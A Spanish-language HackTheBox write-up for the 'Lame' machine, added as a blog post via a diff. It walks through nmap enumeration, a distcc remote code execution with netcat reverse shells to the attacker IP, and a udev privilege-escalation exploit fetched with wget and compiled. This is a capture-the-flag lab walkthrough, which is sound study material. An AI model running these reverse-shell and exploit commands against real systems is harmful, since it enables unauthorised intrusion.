@@ -1,0 +1,127 @@
+---
+layout: post
+title:  "HTB_Lame"
+date:   2020-08-17 18:36:10 -0500
+categories: HackTheBox
+---
+
+## HTB Lame ##
+
+![Pic](/assets/Lame/Picture.png)
+
+### Reconocimiento ###
+
+Utilize la herramienta *Autorecon* de Tiberius para un reconocimiento inicial y en paralelo corri nmap para ver que puertos estaban abiertos.
+
+` nmap -A -p- 10.10.10.3 `
+
+Luego de terminar autorecon - entre en el folder de scans y puedo obtener la siguiente informacion de los puertos abiertos:
+
+- **Puerto 21**: FTP (vsftpd 2.3.4), permite acceso anonimo al share.
+- **Puerto 22**: OpenSSH (4.7p), casi nunca es vulnerable
+- **Puerto 139 y 445**: Samba, uno tiene el 3.0-4.0 y el otro 3.0.20
+- **Puerto 3632**: Distcc, nunca en la vida habia escuchado de ese servicio, autorecon lo muestra en los _pattern
+
+![autorecon](/assets/Lame/autorecondistcc.png)
+
+### Enumeracion ###
+
+#### Puerto21 ####
+Primero empezamos con nuestros puntos de entrada - buscamos en google y nos damos cuenta que esta version de vsftpd es vulnerable, buscamos un script de nmap para asegurarnos de que esto sea posible.
+
+` ls /usr/share/nmap/scripts/ftp* `
+
+Vemos que existe uno para vsftpd que se llama *vsftpd-backdoor.nse*
+
+Ejecutamos el script
+` nmap --script ftp-vsftpd-backdoor.nse -p 21 10.10.10.3 `
+
+Nos dice que no es vulnerable, nos movemos a nuestro siguiente punto de entrada
+
+#### Puerto 22 ####
+SSH es lo ultimo que queremos mirar, pasemos a los samba
+
+#### Puerto 139 ####
+` smbclient -L 10.10.10.3 `
+
+Me da un error *protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED*
+
+` smbmap -H 10.10.10.3 `
+
+Si muestra que tenemos read/write access a un folder que se llama oh noes!
+
+Buscando en google para vulnerabilidades de esta version de Samba, hay varias, pero la mayoria necesitan Metasploit, asi que pasamos a nuestro siguiente puerto
+
+### Exploitation ###
+
+#### Port 3632 Distcc ####
+
+En el _Pattern log de autorecon, sale que nmap encontro una vulnerabilidad en este puerto, para asegurarnos corremos
+
+` nmap --script distcc-cve2004-2687 -p 3632 10.10.10.3 `
+
+Y Efectivamente, si es vulnerable!
+
+Buscando la vulnerabilidad en google - encontramos un script de python que nos puede dar acceso en shell, solo tenemos que seguir las instrucciones.
+
+![script](/assets/Lame/script.png)
+
+- `nc -nlvp 1403`
+- ` exploit.py -t 10.10.10.3 -p 3632 -c "nc 10.10.16.85 1403 -e /bin/sh" `
+
+Cuando corres el exploit te va a dar un socket timeout pero ya estas in - lo que tienes que hacer despues es spawn un TTY shell
+
+` python -c 'import pty; pty.spawn("/bin/sh")' `
+
+![exploit](/assets/Lame/shell.png)
+
+Buscamos nuestro user.txt
+
+### Privilege Escalation ###
+Buscando en google la version del sistema operativo para ver vulnerabilidades encontramos un exploit escrito en .c [2009-1185](https://www.exploit-db.com/exploits/8572) lo buscamos en searchsploit y lo bajamos a nuestro folder.
+
+` searchsploit -m 8572.c `
+
+Seteamos un servidor python en nuestra maquina atacante
+
+` python3 -m http.server `
+
+En la maquina objetivo, hacemos un wget
+
+` wget http://10.10.16.85/8572.c `
+
+Compilamos el exploit usando gcc
+
+` gcc 8572.c -o 8572 `
+
+Seguimos las instrucciones que salen en el script
+
+[Instrucciones]
+
+Tenemos que:
+- Darle el PID (ProcessID) del udevd netlink socket
+- Crear un run file en /tmp y agregarle un reverse shell
+
+` ps -aux | grep devd `
+
+o tambien usando
+
+` cat /proc/net/netlink `
+
+Este va a tener uno menos que el DEVD inet, el que hay que usar - 2687 o el que sale en ` cat /proc/net/netlink `
+
+![inet](/assets/Lame/PID.png)
+
+
+Segundo paso es crear un run file en /tmp y agregarle el reverse shell
+- ` #!/bin/bash `
+- ` nc -nv 10.10.16.85 4444 -e /bin/bash `
+
+Seteamos un listener en nuestra maquina con el puerto que establecimos anteriormente y ejecutamos el exploit con el PID que identificamos
+
+![Root](/assets/Lame/root.png)
+
+### Notas ###
+- Full port scans
+- Enumeracion de servicios
+- Compilar exploits y transferirlos de una maquina a otra
